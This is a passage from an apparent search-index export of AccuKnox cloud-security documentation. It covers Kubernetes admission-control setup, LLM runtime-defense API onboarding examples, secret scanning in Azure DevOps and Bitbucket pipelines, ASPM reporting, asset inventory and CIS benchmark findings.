critical or high-level vulnerabilities that an image can have. This feature will block the deployment of images with known vulnerabilities, maintaining a high security posture for your applications.</p> <p>Info</p> <p>This feature is in the pipeline and will be available soon.</p>"},{"location":"use-cases/admission-controller-knoxguard/#3-security-posture-rules","title":"3. Security Posture Rules","text":"<p>Enforcing security policies like privileged container restrictions and capabilities constraints helps maintain a secure Kubernetes environment. Knoxguard currently supports denying privileged mode containers, with more security rules expected to be added soon.</p>"},{"location":"use-cases/admission-controller-knoxguard/#prerequisite-for-knoxguard-admission-controller","title":"Prerequisite for Knoxguard Admission Controller","text":"<p>Before deploying Knoxguard in your Kubernetes environment, ensure the following prerequisite is met:</p> <ul> <li>Accuknox Agent Installation: Install Accuknox Agents on your Kubernetes cluster. These agents facilitate SaaS integration, alerting, and enforcement.</li> </ul> <p>Info</p> <p>Refer to Cluster On-boarding guide for Accuknox Agents Installation.</p> <p>Verify the agents' status using the following command:</p> <pre><code>userx@fedora:~$ kubectl get pods -n accuknox-agents\nNAME                                      READY   STATUS    RESTARTS           AGE\nagents-operator-d8585d594-55s29           1/1     Running   0                  72d\ndiscovery-engine-59c69ff787-scrrj         4/4     Running   0                  72d\nfeeder-service-765d8f7d65-d4vq2           1/1     Running   13 (2d21h ago)     4d\npolicy-enforcement-agent-f5c5f87b-9fw79   1/1     Running   84 (2d21h ago)     40d\nshared-informer-agent-77569db588-c944p    1/1     Running   1090 (2m36s ago)   40d\n</code></pre>"},{"location":"use-cases/admission-controller-knoxguard/#deployment-of-knoxguard","title":"Deployment of Knoxguard","text":""},{"location":"use-cases/admission-controller-knoxguard/#step-1-deploy-kyverno","title":"Step 1: Deploy Kyverno:","text":"<p>First, you need to deploy Kyverno, a policy engine for Kubernetes, which Knoxguard utilizes for policy enforcement.</p> <pre><code>helm repo add kyverno https://kyverno.github.io/kyverno/\nhelm repo update\nhelm install kyverno kyverno/kyverno -n kyverno --create-namespace\n</code></pre>"},{"location":"use-cases/admission-controller-knoxguard/#step-2-deploy-knoxguard","title":"Step 2: Deploy Knoxguard:","text":"<p>Next, deploy Knoxguard in your Kubernetes cluster. Knoxguard will work in tandem with Kyverno to enforce the defined policies.</p> <pre><code>helm upgrade --install knoxguard oci://public.ecr.aws/k9v9d5v2/knoxguard-chart --version=v0.2.0 -n knoxguard --create-namespace\n</code></pre> <p>Verify the deployments:</p> <pre><code>userx@fedora:~$ kubectl get deployments -n knoxguard\nNAME                                    READY   UP-TO-DATE   AVAILABLE   AGE\naccuknox-knoxguard-controller-manager   1/1     1            1           16s\nuserx@fedora:~$ kubectl get pods -n kyverno\nNAME                                                       READY   STATUS      RESTARTS      AGE\nkyverno-admission-controller-78d5464dbc-p2248              1/1     Running     1 (49m ago)   52m\nkyverno-background-controller-5f96748b4c-mrcxm             1/1     Running     0             52m\nkyverno-cleanup-admission-reports-28796130-mzg8t           0/1     Completed   0             4m2s\nkyverno-cleanup-cluster-admission-reports-28796130-9nkb7   0/1     Completed   0             4m2s\nkyverno-cleanup-cluster-ephemeral-reports-28796130-drsmn   0/1     Completed   0             4m2s\nkyverno-cleanup-controller-7b5fb595d6-x57g7                1/1     Running     0             52m\nkyverno-cleanup-ephemeral-reports-28796130-mxnxk           0/1     Completed   0             4m2s\nkyverno-reports-controller-76cd67fb8d-v66wm                1/1     Running     1 (49m ago)   52m\n</code></pre>"},{"location":"use-cases/admission-controller-knoxguard/#policy-enforcement","title":"Policy Enforcement","text":"<p>Once Knoxguard is deployed, you can start enforcing policies within your cluster. This involves Creating, uploading and activating your custom admission policies.</p> <p>To enforce the admission policy, follow these steps with example:</p> <ol> <li>Define the Admission Policy: Create an AdmissionPolicy resource based on the requirement. Below is the configuration to block privileged pod admission in the default namespace:</li> </ol> <pre><code>apiVersion: admission.accuknox.com/v1\nkind: AdmissionPolicy\nmetadata:\n  labels:\n    app.kubernetes.io/name: admission-controller\n    app.kubernetes.io/managed-by: kustomize\n  name: test-priv-pod-policy\nspec:\n  denyPrivilegedPod:\n    action: Block\n    targetNamespaces:\n    - default\n</code></pre> <ol> <li>Upload and Activate Admission Policies:</li> </ol> <p>Use the upload YAML feature to upload your custom admission policies by clicking on Create Policy. This allows you to define and enforce policies specific to your security requirements.</p> <p></p> <p></p> <p>After uploading and activating the policy, you can verify its status with the following command:</p> <pre><code>userx@fedora:~$ kubectl get admissionpolicy\nNAME                   READY   MESSAGE                                       OWNED_PPLICIES\ntest-priv-pod-policy   True    clusterpolicy has been updated successfully   [\"knoxguard-privilege-pod-test-priv-pod-policy\"]\n</code></pre>"},{"location":"use-cases/admission-controller-knoxguard/#policy-violation-and-alerts","title":"Policy Violation and Alerts","text":"<p>In the event of a policy violation, Accuknox provides detailed alerts to help you understand and mitigate security issues.</p> <p>First, attempt to deploy a privileged pod using the following configuration:</p> <pre><code>apiVersion: v1\nkind: Pod\nmetadata:\n  name: test-privileged\n  namespace: default\nspec:\n  containers:\n  - name: nginx\n    image: nginx:latest\n    securityContext:\n      privileged: true  # Should be blocked\n</code></pre> <p>Upon execution, you will receive an error message indicating that the request has been denied due to policy enforcement.</p> <pre><code>userx@fedora:~$ kubectl apply -f privpod.yaml\nError from server: error when creating \"privpod.yaml\": admission webhook \"validate.kyverno.svc-fail\" denied the request:\n\nresource Pod/default/test-privileged was blocked due to the following policies\n\nknoxguard-privilege-pod-test-priv-pod-policy:\n  privileged-containers: \"validation error: Privileged mode is disallowed. The fields\n    spec.containers[].securityContext.privileged,\\n\\t\\t\\t\\tspec.initContainers[].securityContext.privileged,\n    and spec.ephemeralContainers[*].securityContext.privileged must be unset or set\n    to false. rule privileged-containers failed at path /spec/containers/0/securityContext/privileged/\"\n</code></pre> <p>Navigate to Monitors &gt; Alerts in the AccuKnox dashboard. Change the alert type to Admission Controller to view alerts related to admission policy violations. The system provides comprehensive logging to help you quickly identify and address any security concerns.</p> <p>Info</p> <p>These logs can be forwarded to SIEM tools or notification tools by setting up triggers for improved security monitoring. Refer to the guide here for more details.</p> <p></p>"},{"location":"use-cases/aiml-runtime-onboard/","title":"Onboard Custom Applications","text":""},{"location":"use-cases/aiml-runtime-onboard/#step-1-understand-the-api-purpose","title":"Step 1: Understand the API Purpose","text":"<p>The endpoint <code>https://app.mod.accuknox.com/modelknox_runtime/application-query</code> acts as a proxy server that receives and processes user queries. It supports LLM Runtime Defense, which monitors and optionally blocks suspicious queries/responses when interacting with your application.</p>"},{"location":"use-cases/aiml-runtime-onboard/#step-2-prepare-required-fields","title":"Step 2: Prepare Required Fields","text":"<ul> <li> <p>Authorization: <code>Bearer &lt;Bearer-Token&gt;</code>   (Used to authenticate the request with AccuKnox \u2014 do not change this token.)</p> </li> <li> <p>User: <code>&lt;ENTER USER INFO&gt;</code>   (Specify the user identity \u2014 e.g., email \u2014 to trace who initiated the query.)</p> </li> <li> <p>Secret-Token: <code>&lt;ENTER SECRET TOKEN&gt;</code>   (This is a credential/token tied to your application instance.)</p> </li> <li> <p>Request Payload:   (Include relevant parameters in JSON format. Example below.)</p> </li> </ul>"},{"location":"use-cases/aiml-runtime-onboard/#step-3-choose-your-integration-method","title":"Step 3: Choose Your Integration Method","text":""},{"location":"use-cases/aiml-runtime-onboard/#python-with-requests-library","title":"Python (with requests library)","text":"<pre><code>import requests\n\nurl = \"https://app.mod.accuknox.com/modelknox_runtime/application-query\"\n\nheaders = {\n    \"Authorization\": \"Bearer &lt;YOUR_JWT_TOKEN&gt;\",\n    \"Content-Type\": \"application/json\",\n    \"User\": \"&lt;ENTER USER INFO&gt;\",\n    \"Secret-Token\": \"&lt;ENTER SECRET TOKEN&gt;\"\n}\n\npayload = {\n    \"asset_id\": \"abc123\",\n    \"cloud\": \"aws\",\n    \"region\": \"us-west-2\"\n}\n\nresponse = requests.post(url, headers=headers, json=payload)\n\nprint(\"Status Code:\", response.status_code)\nprint(\"Response:\", response.json())\n</code></pre>"},{"location":"use-cases/aiml-runtime-onboard/#terminal-using-curl","title":"Terminal (using curl)","text":"<pre><code>curl -X POST 'https://app.mod.accuknox.com/modelknox_runtime/application-query' \\\n  -H 'Authorization: Bearer &lt;YOUR_JWT_TOKEN&gt;' \\\n  -H 'Content-Type: application/json' \\\n  -H 'User: &lt;ENTER USER INFO&gt;' \\\n  -H 'Secret-Token: &lt;ENTER SECRET TOKEN&gt;' \\\n  -d '{\n        \"asset_id\": \"abc123\",\n        \"cloud\": \"aws\",\n        \"region\": \"us-west-2\"\n      }'\n</code></pre>"},{"location":"use-cases/aiml-runtime-onboard/#javascript-nodejs-fetch-api-express","title":"JavaScript (Node.js / Fetch API / Express)","text":"<pre><code>const fetch = require(\"node-fetch\"); // npm install node-fetch if needed\n\nconst url = \"https://app.mod.accuknox.com/modelknox_runtime/application-query\";\n\nconst headers = {\n  Authorization: \"Bearer &lt;YOUR_JWT_TOKEN&gt;\",\n  \"Content-Type\": \"application/json\",\n  User: \"&lt;ENTER USER INFO&gt;\",\n  \"Secret-Token\": \"&lt;ENTER SECRET TOKEN&gt;\",\n};\n\nconst payload = {\n  asset_id: \"abc123\",\n  cloud: \"aws\",\n  region: \"us-west-2\",\n};\n\nfetch(url, {\n  method: \"POST\",\n  headers: headers,\n  body: JSON.stringify(payload),\n})\n  .then((res) =&gt; res.json())\n  .then((data) =&gt; console.log(\"Response:\", data))\n  .catch((err) =&gt; console.error(\"Error:\", err));\n</code></pre>"},{"location":"use-cases/aiml-usecases/","title":"AI/ML Security Use Cases","text":"<p>Useful Links</p> <ul> <li>For onboarding refer to the AI/ML Onboarding Guide</li> <li>For list of supported platforms refer to the AI/ML Security Support Matrix</li> </ul> <p>AI-DR (Detection &amp; Runtime Protection)</p><p>Detect and defend against AI-specific threats like prompt injection and model abuse with runtime visibility and enforcement.</p> <p>Jupyter Notebook Security</p><p>Secure Jupyter Notebooks with access controls, activity monitoring, and data protection to prevent unauthorized access and data leaks.</p> <p>ModelArmor</p><p>Protect machine learning models from theft, adversarial attacks, and unauthorized access with encryption and usage monitoring.</p>"},{"location":"use-cases/app-behavior/","title":"Application Behavior","text":"<p>Zero-Trust security model is such that it advocates for deny by default and only allow tailored whitelisted activities to ensure the smooth functionality with security. In order to do that, AccuKnox\u2019s Cloud Workload Protection Platform (CWPP) achieves runtime security by leveraging CNCF sandbox project, KubeArmor, which is a cloud-native runtime security enforcement system by AccuKnox. It does that by having a more granular control over the application behavior (such as process execution, file access, and networking operation). With KubeArmor, a user can:</p> <ul> <li> <p>restrict file system access for certain processes</p> </li> <li> <p>restrict what processes can be spawned within the pod</p> </li> <li> <p>restrict the capabilities that can be used by the processes within the pod</p> </li> </ul> <p>Lets understand this by following use-case example - Auditing Application Behavior of MySQL application</p> <p>1.Install workload: <code>sh  kubectl apply -f https://raw.githubusercontent.com/kubearmor/KubeArmor/main/examples/wordpress-mysql/wordpress-mysql-deployment.yaml</code></p> <p>2.Showing App behavior screen in the context of the wordpress-mysql application.</p> <ul> <li>Network Graph</li> </ul> <p></p> <p></p> <ul> <li>File Observability</li> </ul> <p></p> <ul> <li>Process Observability</li> </ul> <p></p> <ul> <li>Network Observability</li> </ul> <p></p> <p>SCHEDULE DEMO</p>"},{"location":"use-cases/app-hardening/","title":"App Hardening","text":"<p>One of the methods to achieve for a zero-trust environment is Application Hardening. KubeArmor is a security solution for the Kubernetes and cloud native platforms that helps protect your workloads from attacks and threats. It does this by providing a set of hardening policies which is a block based policies. It is based on industry-leading technical conformance to standard compliance and attack frameworks such as CIS, MITRE, NIST-800-53, and STIGs. These policies are designed to help you secure your workloads in a way that is compliant with these frameworks and recommended best practices.</p> <p>Lets understand by taking an use-case example - Disallowing any binaries execution to prevent from RCE Vulnerability</p> <p>1.Select your cluster and namespace from this Policies screen. We will be getting list of hardening policies for the selected Namespace.</p> <p></p> <p>2.Applying the hardening policies</p> <p>3.Selecting the below hardening policy to apply</p> <p></p> <p>4.Select this policy and click on the apply option</p> <p></p> <p>5.After applying the above hardening policy, it goes into pending state</p> <p></p> <p>6.To make it active the user needs to approve</p> <p></p> <p>7.After approval policy goes into active state.</p> <p></p> <p>SCHEDULE DEMO</p>"},{"location":"use-cases/aspm-reports/","title":"ASPM Reporting Features","text":"<p>This document provides comprehensive guidance on utilizing the Application Security Posture Management (ASPM) reporting features within the platform. Learn how to generate, customize, and interpret your security posture reports.</p> <p>To view how a sample report looks, refer to the ASPM Report Sample.</p>"},{"location":"use-cases/aspm-reports/#overview-report-access","title":"Overview &amp; Report Access","text":"<p>The ASPM reporting feature allows users to generate detailed reports on their application security posture. These reports provide an in-depth analysis of critical vulnerabilities, compliance gaps, and risk factors across your cloud infrastructure.</p> <p></p> <p>To access the reporting features:</p> <ol> <li>Navigate to the Reports section of the platform.</li> <li>Here, you will find a dashboard listing all your report configurations and generated reports.</li> </ol> <p></p>"},{"location":"use-cases/aspm-reports/#available-report-types-purpose","title":"Available Report Types &amp; Purpose","text":""},{"location":"use-cases/aspm-reports/#on-demand-reports","title":"On-Demand Reports","text":"<p>Designed for immediate insights into your current security posture. They provide a snapshot of findings based on the specified date range and configurations.</p>"},{"location":"use-cases/aspm-reports/#scheduled-reports","title":"Scheduled Reports","text":"<p>These reports are generated automatically and recurring in nature at defined intervals (e.g., daily, weekly, monthly) to keep stakeholders informed about ongoing security status and trends.</p>"},{"location":"use-cases/aspm-reports/#generating-customizing-reports","title":"Generating &amp; Customizing Reports","text":"<p>To create a new ASPM report:</p> <ol> <li>Click on the Add ASPM Report button from the Reports dashboard.</li> <li>You will be directed to the report configuration page, where you can customize your report.</li> </ol>"},{"location":"use-cases/aspm-reports/#report-configuration-options","title":"Report Configuration Options","text":"<ul> <li>Report Name: Assign a unique and descriptive name (e.g., <code>\"Monthly SAST Scan Report\"</code>).</li> <li>Description: Provide an optional, brief explanation of the report\u2019s purpose.</li> <li>Email: Add one or more email addresses to send the report to.</li> <li>Label: Filter scope by asset labels (e.g., specific projects, teams, or environments).</li> <li>Repository: Select one or more repositories (supports GitHub, Bitbucket, GitLab, or self-hosted).</li> <li> <p>Finding Categories: Choose categories to include:</p> <ul> <li>SAST (Static Application Security Testing)</li> <li>DAST (Dynamic Application Security Testing)</li> <li>SCA (Software Composition Analysis)</li> <li>IaC (Infrastructure as Code)</li> <li>Secret Scan</li> </ul> </li> <li> <p>Tool: Filter results by specific tools (e.g., include only Trivia or CX Containers).</p> </li> <li>Date Range: Choose a reporting period (up to 30 days; 60-day support coming soon).</li> </ul> <p>After configuration, click Save to trigger the on-demand report generation.</p> <p></p> <p></p> <p></p>"},{"location":"use-cases/aspm-reports/#export-options","title":"Export Options","text":"<ul> <li>Download: Export PDF via the Download button.</li> <li>Generate (New Version): Refresh report with updated data using existing configuration.</li> <li>Retry (Failed Reports): Retry generation for failed reports.</li> </ul>"},{"location":"use-cases/aspm-reports/#interpreting-report-data-drill-downs","title":"Interpreting Report Data &amp; Drill-Downs","text":"<p>The generated PDF report contains:</p> <ul> <li>Report Summary: Totals for findings, critical issues, and top vulnerable assets.</li> <li>Findings by Severity: Bar charts visualizing critical, high, medium, and low severity findings.</li> <li>Findings Trend by Severity: Line graphs showing how severity counts have changed.</li> <li>Top Findings/Assets: Tables highlighting top findings and most affected assets.     </li> </ul>"},{"location":"use-cases/aspm-reports/#report-data-summary","title":"Report Data Summary","text":"<p>The report breaks down findings by category with severity and trend data:</p> <ul> <li>SAST Findings: Details on code vulnerabilities, including a severity breakdown, historical trends, the top 5 findings, and the most vulnerable repositories.</li> <li>DAST Findings: A summary of domain-level vulnerabilities, their severity distribution and trends, and a list of the top 5 findings, vulnerable domains, and endpoints.</li> <li>Container Image Findings: A summary of scan results, a severity trend chart, and a list of the top CVEs, vulnerable packages, and affected images.</li> <li>IaC Findings: Information on code-based vulnerabilities, including the top 5 findings and the repositories and frameworks they affect.</li> <li>Secret Scan Findings: A summary of exposed secrets, a breakdown by severity and verification status, and a list of the top repositories and contributors with leaked secrets.</li> </ul>"},{"location":"use-cases/aspm/","title":"Application Security Posture Management (ASPM)","text":""},{"location":"use-cases/aspm/#aspm-application-security-posture-management","title":"ASPM (Application Security Posture Management)","text":"<p>ASPM provides a continuous and integrated security framework, enabling organizations to gain real-time insights into their application landscape. Unlike traditional siloed approaches, ASPM embeds visibility, assessment, and risk mitigation into every phase of the development lifecycle, fostering seamless collaboration between security and development teams.</p>"},{"location":"use-cases/aspm/#use-cases","title":"Use Cases","text":"<p>Container Scanning</p> <p>SAST</p> <p>Vulnerability Management</p> <p>DAST (MFA-Enabled)</p> <p>DAST XSS Mitigation</p> <p>Secret Scan in CI/CD</p> <p>Generate ASPM Reports</p> <p>Secrets in S3 Buckets &amp; File Systems</p> <p>Rules Engine &amp; Automated Ticket Creation</p> <p>EPSS Scoring for Prioritization</p> <p>SCA</p> <p>Secrets in Container Images</p> <p>Secrets in Kubernetes ConfigMaps</p> <p>IaC Security</p>"},{"location":"use-cases/aspm/#accuknox-features","title":"AccuKnox Features","text":"<ul> <li>Unified security test orchestration (SAST, DAST, SCA)</li> <li>Scheduled and on-demand ASPM Reports</li> <li>CI/CD pipeline security integration</li> <li>Context-driven risk prioritization</li> <li>End-to-end security coverage</li> <li>Continuous security posture monitoring</li> </ul>"},{"location":"use-cases/aspm/#advanced-scanning-capabilities","title":"Advanced Scanning Capabilities","text":"<ul> <li>IaC and container scanning</li> <li>Supports self-hosted and isolated registries</li> <li>Enterprise-grade compliance detection</li> </ul> <p>Info</p> <p>AccuKnox supports Integrations with a wide range of tools for streamlined workflows.</p> <p>Info</p> <p>For more information on our ASPM offerings, visit the AccuKnox ASPM Page.</p>"},{"location":"use-cases/asset-inventory/","title":"Asset Inventory Guide","text":"<p>Users with multiple cloud accounts and workloads across various public clouds often face challenges in getting a comprehensive view of their cloud assets in a single place. Switching between various cloud provider consoles to monitor these assets becomes a huge problem.</p> <p>AccuKnox solves this user problem by providing a single pane of view for cloud accounts, assets, and workloads present across multiple cloud platforms.</p> <p>Once the user onboards the cloud account, the AccuKnox CSPM tool scans the cloud account for assets like hosts, applications, Web APIs, containers, clusters, and more. Asset count will increase or decrease based on changes in the onboarded cloud account. This is handled by periodic scans that the AccuKnox CSPM tool runs at fixed time intervals.</p> <p>AccuKnox gives users the ability to view their assets from two different perspectives.</p>"},{"location":"use-cases/asset-inventory/#step-1-accessing-asset-inventory","title":"Step 1: Accessing Asset Inventory","text":"<p>To access the \u2018Asset Inventory\u2019, the first step is to:</p> <ul> <li>Click on \u2018Inventory\u2019</li> <li>Then click on \u2018Cloud Assets\u2019 </li> </ul>"},{"location":"use-cases/asset-inventory/#step-2-list-perspective","title":"Step 2: List Perspective","text":"<p>Inside \u2018Cloud Assets\u2019, users have the assets displayed in the list perspective, which separates them by \u2018Asset Category\u2019 and provides other useful information such as the findings associated with that category. </p>"},{"location":"use-cases/asset-inventory/#update-assets-view","title":"Update Assets View","text":"<p>If desired, the user can click the asset category to view in more detail:</p> <ul> <li>The specific asset</li> <li>Its type</li> <li>Findings</li> <li>And more</li> </ul> <p></p>"},{"location":"use-cases/asset-inventory/#step-3-hierarchy-perspective","title":"Step 3: Hierarchy Perspective","text":"<p>The second perspective is the hierarchy view, which can be accessed by clicking on the blue button on the right side of the screen.</p> <p>The hierarchical perspective provides users with a different view of their onboarded assets, giving versatility and options that satisfy their needs. </p>"},{"location":"use-cases/asset-inventory/#step-4-using-dashboard-widgets","title":"Step 4: Using Dashboard Widgets","text":"<p>Widgets on the main dashboard are another opportunity to get useful insights about assets. Asset findings will be listed along with a graphical view of asset findings that can be explored further.</p> <p></p>"},{"location":"use-cases/asset-inventory/#step-5-asset-details","title":"\ud83d\udd0d Step 5: Asset Details","text":"<p>When the user clicks one of the assets from the list, they will get detailed information such as:</p> <ul> <li>Asset name</li> <li>Asset type</li> <li>Vulnerability findings associated with the asset</li> <li>Vulnerability name</li> <li>Message</li> <li>Risk factor</li> <li>Description</li> <li>When the vulnerability was scanned</li> <li>Cloud account</li> <li>Cloud Type</li> <li>Asset location</li> <li>Associated compliance</li> <li>Status of the finding</li> <li>Asset label</li> <li>A boolean to indicate if the vulnerability should be ignored or not</li> </ul> <p></p> <p>AccuKnox SaaS provides the vulnerability findings that have passed or failed the baseline compliance set for the cloud account.</p> <p>SCHEDULE DEMO</p>"},{"location":"use-cases/azure-secret-scan/","title":"Azure DevOps Secret Scan","text":"<p>This guide walks you through the process of integrating AccuKnox Secret Scanning into your Azure DevOps pipeline. By doing so, you can efficiently detect and handle hard-coded secrets within your codebase to improve the overall security posture of your applications.</p>"},{"location":"use-cases/azure-secret-scan/#prerequisites","title":"Prerequisites","text":"<ul> <li> <p>Access to an Azure DevOps project.</p> </li> <li> <p>An active AccuKnox account.</p> </li> <li> <p>A configured Azure DevOps agent for pipeline execution.</p> </li> </ul>"},{"location":"use-cases/azure-secret-scan/#integration-steps","title":"Integration Steps","text":""},{"location":"use-cases/azure-secret-scan/#step-1-install-accuknox-secret-scanning-extension","title":"Step 1: Install AccuKnox Secret Scanning Extension","text":"<ol> <li> <p>Visit the Azure DevOps Marketplace.</p> </li> <li> <p>Search for AccuKnox Secret Scanning and select Get it free to add to your Azure DevOps organization.     </p> </li> <li> <p>Choose your Azure organization and click Install.     </p> </li> <li> <p>Once installed, the AccuKnox Secret Scanning extension will be available in your pipeline.     </p> </li> </ol>"},{"location":"use-cases/azure-secret-scan/#step-2-generate-an-accuknox-api-token","title":"Step 2: Generate an AccuKnox API Token","text":"<ol> <li> <p>Log in to the AccuKnox platform.</p> </li> <li> <p>Go to Settings &gt; Tokens and create a new token.</p> </li> <li> <p>Copy the token and save it for later use. For guidance on creating tokens, refer to Creating Tokens in AccuKnox.</p> </li> </ol>"},{"location":"use-cases/azure-secret-scan/#step-3-set-up-variables-in-azure-devops","title":"Step 3: Set Up Variables in Azure DevOps","text":"<ol> <li> <p>Navigate to your Azure DevOps project.</p> </li> <li> <p>Go to Project Settings &gt; Pipelines &gt; Library and click + Variable Group.</p> </li> <li> <p>Add the following variables:</p> </li> </ol> Variable Description Default Value <code>results</code> Specifies which type(s) of results to output: <code>verified</code>, <code>unknown</code>, <code>unverified</code>, <code>filtered_unverified</code>. Defaults to all types. <code>\"\"</code> <code>branch</code> The branch to scan. Use <code>all-branches</code> to scan all branches. <code>\"\"</code> <code>excludePaths</code> Paths to exclude from the scan. <code>\"\"</code> <code>additionalArguments</code> Extra parameters for secret scanning. <code>\"\"</code> <code>inputSoftFail</code> Do not return an error code if secrets are found. <code>true</code> <code>accuknoxToken</code> The token for authenticating with the CSPM panel. N/A (Required) <code>accuknoxEndpoint</code> The URL of the CSPM panel to push the scan results to. N/A (Required) <code>accuknoxLabel</code> The label created in AccuKnox SaaS for associating scan results. N/A (Required)"},{"location":"use-cases/azure-secret-scan/#step-4-configure-pipeline-to-run-secret-scanning","title":"Step 4: Configure Pipeline to Run Secret Scanning","text":"<ol> <li> <p>Open or create your pipeline's YAML file in Azure DevOps.</p> </li> <li> <p>Add the following task to your pipeline's <code>steps</code> section:</p> </li> </ol> <pre><code>steps:-\n  task: accuknox-secret-scan@1.0.2\n  inputs:\n    accuknoxEndpoint: $(accuknoxEndpoint)\n    accuknoxToken: $(accuknoxToken)\n    accuknoxLabel: $(accuknoxLabel)\n    inputSoftFail: true\n</code></pre>"},{"location":"use-cases/azure-secret-scan/#step-5-trigger-the-pipeline","title":"Step 5: Trigger the Pipeline","text":"<ul> <li> <p>Manually trigger the pipeline or push a code change to initiate the scanning process.</p> </li> <li> <p>Monitor the pipeline logs to ensure the AccuKnox Secret Scanning task executes successfully.</p> </li> </ul> <p></p>"},{"location":"use-cases/azure-secret-scan/#view-results-in-accuknox-saas","title":"View Results in AccuKnox SaaS","text":"<ol> <li> <p>Once the pipeline finishes, log in to the AccuKnox SaaS dashboard.</p> </li> <li> <p>Navigate to Issues &gt; Findings, then select Secret Scan Findings.     </p> </li> <li> <p>Review the list of identified hardcoded secrets or sensitive data.     </p> </li> <li> <p>Address Findings, for each finding, create a task in your issue-tracking system, advising secret rotation and the use of a secure secret management solution. Once resolved, mark the issue as fixed in the AccuKnox platform.     </p> </li> </ol>"},{"location":"use-cases/azure-secret-scan/#conclusion","title":"Conclusion","text":"<p>By integrating AccuKnox Secret Scanning into your Azure DevOps pipeline, you gain an essential layer of security to proactively detect and manage hardcoded secrets within your code. This integration helps safeguard your applications and ensures that your security practices stay strong throughout the development lifecycle.</p>"},{"location":"use-cases/bitbucket-secret-scan/","title":"Bitbucket Secret Scan","text":"<p>This guide explains integrating AccuKnox Secret Scanning into your Bitbucket CI/CD Pipeline. The integration enhances code security by detecting hard-coded secrets and sensitive information in your repositories. It then uploads the results to the AccuKnox SaaS platform for further analysis and remediation.</p>"},{"location":"use-cases/bitbucket-secret-scan/#pre-requisites","title":"Pre-requisites","text":"<p>To integrate AccuKnox Secret Scanning, ensure you have:</p> <ul> <li> <p>Access to Bitbucket Pipelines.</p> </li> <li> <p>An active AccuKnox Platform account.</p> </li> </ul>"},{"location":"use-cases/bitbucket-secret-scan/#steps-for-integration","title":"Steps for Integration","text":""},{"location":"use-cases/bitbucket-secret-scan/#step-1-log-in-to-accuknox","title":"Step 1: Log in to AccuKnox","text":"<ol> <li> <p>Log in to the AccuKnox SaaS platform.</p> </li> <li> <p>Navigate to Settings &gt; Tokens and generate a token to enable scan result uploads. For details on generating tokens, refer to How to Create Tokens.</p> </li> </ol>"},{"location":"use-cases/bitbucket-secret-scan/#step-2-configure-cicd-variables","title":"Step 2: Configure CI/CD Variables","text":"<ol> <li> <p>Go to your Bitbucket repository settings.</p> </li> <li> <p>Add the following variables, for details on configuring variables, refer to How to Create CI/CD Variables in Bitbucket.</p> <ul> <li> <p>ACCUKNOX_TOKEN: Your AccuKnox API token.</p> </li> <li> <p>ACCUKNOX_TENANT: Your AccuKnox tenant ID.</p> </li> <li> <p>ACCUKNOX_ENDPOINT: Your AccuKnox API endpoint.</p> </li> <li> <p>ACCUKNOX_LABEL: Label for scan results.</p> </li> </ul> </li> </ol>"},{"location":"use-cases/bitbucket-secret-scan/#step-3-update-the-bitbucket-pipelinesyml-file","title":"Step 3: Update the <code>bitbucket-pipelines.yml</code> File","text":"<p>Add the following secret scanning configuration to your pipeline:</p> <pre><code>pipelines:\n  branches:\n    secret-with-pipe:\n      - step:\n          name: AccuKnox Secret Scan\n          script:\n            - pipe: accu-knox/scan:1.0.1\n              variables:\n                SCAN_TYPE: SECRET\n                INPUT_SOFT_FAIL: \"true\"\n                ACCUKNOX_TOKEN: ${ACCUKNOX_TOKEN}\n                ACCUKNOX_TENANT: ${ACCUKNOX_TENANT}\n                ACCUKNOX_ENDPOINT: ${ACCUKNOX_ENDPOINT}\n                ACCUKNOX_LABEL: ${ACCUKNOX_LABEL}\n</code></pre>"},{"location":"use-cases/bitbucket-secret-scan/#step-4-commit-and-push-changes","title":"Step 4: Commit and Push Changes","text":"<ul> <li> <p>Commit the updated <code>bitbucket-pipelines.yml</code> file to your repository.</p> </li> <li> <p>Push the changes to trigger the pipeline.</p> </li> </ul>"},{"location":"use-cases/bitbucket-secret-scan/#initial-cicd-pipeline-without-accuknox-secret-scan","title":"Initial CI/CD Pipeline Without AccuKnox Secret Scan","text":"<p>Before integrating AccuKnox Secret Scanning, your pipeline might lack any security checks for detecting hardcoded secrets, potentially exposing sensitive information.</p>"},{"location":"use-cases/bitbucket-secret-scan/#cicd-pipeline-after-accuknox-secret-scan-integration","title":"CI/CD Pipeline After AccuKnox Secret Scan Integration","text":"<p>Once the AccuKnox Secret Scanning is integrated into the CI/CD pipeline, every push triggers a secret scan. This scan detects hardcoded secrets and sensitive information in the code, ensuring immediate identification and remediation. The findings are then sent to the AccuKnox platform. Only the findings details are sent to the AccuKnox platform, not the secrets themselves.</p> <p></p>"},{"location":"use-cases/bitbucket-secret-scan/#view-results-in-accuknox-saas","title":"View Results in AccuKnox SaaS","text":""},{"location":"use-cases/bitbucket-secret-scan/#step-1-navigate-to-the-dashboard","title":"Step 1: Navigate to the Dashboard","text":"<p>Go to Issues &gt; Findings and select Secret Scan Findings.</p> <p></p>"},{"location":"use-cases/bitbucket-secret-scan/#step-2-review-detected-secrets","title":"Step 2: Review Detected Secrets","text":"<p>Examine the list of identified hardcoded secrets an d sensitive information.</p> <p></p>"},{"location":"use-cases/bitbucket-secret-scan/#step-3-resolve-findings","title":"Step 3: Resolve Findings","text":"<p>Create a ticket in your issue-tracking system for each finding, recommending rotating the exposed secret and using a secure secret management solution for handling secrets. Once the issue is resolved, mark it as fixed in the AccuKnox platform.</p> <p></p>"},{"location":"use-cases/bitbucket-secret-scan/#conclusion","title":"Conclusion","text":"<p>Integrating AccuKnox Secret Scanning into your Bitbucket pipeline provides an essential layer of security, identifying and mitigating risks early in the development lifecycle. This proactive approach ensures that sensitive information is safeguarded, contributing to a more secure codebase.</p>"},{"location":"use-cases/cis-benchmarking/","title":"CIS K8s Benchmark Findings","text":"<p>After the initial scan is completed, you can view the compliance results</p> <p>Info</p> <p>Note: etcd should be configured for peer authentication</p>"},{"location":"use-cases/cis-benchmarking/#description","title":"Description","text":"<p>etcd is a highly available key-value store used by Kubernetes deployments to store all of its REST API objects persistently. These sensitive objects should be accessible only by authenticated etcd peers in the etcd cluster.</p>"},{"location":"use-cases/cis-benchmarking/#steps","title":"Steps","text":"<ol> <li> <p>Go to Issues &gt; Findings in Accuknox.</p> </li> <li> <p>Use the Findings dropdown to filter and select CIS k8s Benchmarking finding results</p> </li> <li> <p>Apply the risk factor as Critical filter and select Failed from the Tool Output filter</p> </li> <li> <p>Click on Apply</p> </li> </ol> <p></p> <p></p> <p>Solution:</p> <p></p> <p>All peers attempting to communicate with the etcd server will require a valid client certificate for authentication</p> <p>Info</p> <p>Note: Ensure that the --kubelet-certificate-authority argument is set as 